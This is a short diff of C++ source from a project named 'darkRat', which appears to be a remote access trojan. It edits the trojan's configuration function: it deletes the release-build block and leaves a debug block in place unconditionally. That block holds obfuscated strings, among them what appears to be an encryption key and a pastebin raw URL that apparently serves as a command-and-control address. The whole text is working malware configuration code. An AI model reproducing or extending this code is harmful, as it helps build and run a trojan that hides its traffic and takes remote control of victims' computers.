@@ -83,7 +83,6 @@ namespace darkRat
 
 			}
 
-#if _DEBUG
 			return config(OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>"),
 				OBFUSCATE("http://pastebin.com/raw/wJJPteV2"), //Debug
 				OBFUSCATE("3mCUq1z"),
@@ -94,20 +93,7 @@ namespace darkRat
 				OBFUSCATE("SUq1rx"),
 				{}
 			);
-#endif
-#if NDEBUG 
-			return config(OBFUSCATE("1YqsiIPGf3mCzRuKqo46ZohUKeZFzTDH"),
-				OBFUSCATE("https://pastebin.com/raw/Qq0sfw23"), //Debug
-				OBFUSCATE("Qq0sfw23"),
-				OBFUSCATE("true"),
-				OBFUSCATE("600"),
-				OBFUSCATE("true"),
-				OBFUSCATE("main"),
-				OBFUSCATE("SUq1rx"),
-				{}
-			);
-#endif
-			
+
 			
 			
 
